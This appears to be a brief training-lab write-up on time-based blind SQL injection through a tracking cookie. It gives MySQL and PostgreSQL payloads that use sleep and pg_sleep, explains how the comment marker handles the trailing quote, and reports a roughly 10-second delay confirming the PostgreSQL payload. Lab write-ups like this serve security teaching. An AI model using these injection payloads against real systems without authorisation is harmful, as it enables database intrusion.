To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.

vulnerable parameter - _tracking cookie_

# End goal: to prove the field is vulnerable to blind SQL injection (time based)

The query at the back should be something looks like this:  
`SELECT tracking-id FROM tracking-table where tracking-id = '70ARFG5MSt8mo3I6'`

What we are going to do is to add on the end trying different syntax.  
## MySQL：  
`' || (SELECT sleep(10)) --`  
> please pay attention to the '--', as when we add on at the end, it looks like:    
`SELECT tracking-id FROM tracking-table where tracking-id = '70ARFG5MSt8mo3I6 ' || (SELECT sleep(10)) --'`   
> The second part was inserted right in front of the second quotation mark of '70ARFG5MSt8mo3I6'.  
>There was one more quotation mark at the very end, and we need to common out it.    


## PostgreSQL:  
`' || (SELECT pg_sleep(10)) --`  
This time we have waited for 10,329 millis to get the 200 OK response. This means we got it right.   
